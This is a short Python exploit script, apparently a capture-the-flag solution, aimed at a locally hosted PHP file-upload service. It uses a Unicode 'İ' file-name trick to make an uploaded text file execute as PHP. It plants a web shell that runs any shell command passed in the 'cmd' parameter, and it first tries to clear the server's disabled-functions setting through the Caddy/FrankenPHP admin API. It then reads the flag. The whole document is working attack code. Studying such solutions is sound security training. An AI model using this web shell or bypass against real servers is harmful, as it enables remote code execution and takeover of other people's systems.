from time import sleep

import requests

url = "http://127.0.0.1:8080"
session = requests.Session()

char = "İ"


def create():
    response = session.get(
        url,
        params={"action": "create", "filename": char * 4 + ".txt.php"},
    )
    assert "File created." in response.text


def upload():
    files = {
        "file": (
            char * 4 + ".txt",
            """<?php
if (!function_exists('system')) {
  $ctx = stream_context_create(array('http' => array(
      'method' => 'PUT',
      'header' => 'Content-Type: application/json',
      'content' => '""',
      'timeout' => 1,
  )));
  file_get_contents('http://localhost:2019/config/apps/frankenphp/php_ini/disable_functions', false, $ctx);
}
system($_GET['cmd']);
?>""",
        ),
    }
    response = session.post(url, files=files, params={"action": "upload"})
    assert "File uploaded successfully." in response.text


def shell(cmd):
    try:
        session.get(url + "/" + char * 4 + ".txt.php", params={"cmd": cmd}, timeout=1)
    except Exception:
        pass
    sleep(1)
    response = session.get(
        url + "/" + char * 4 + ".txt.php",
        params={"cmd": cmd},
    )
    print(response.text)


if __name__ == "__main__":
    create()
    upload()
    shell("/readflag")
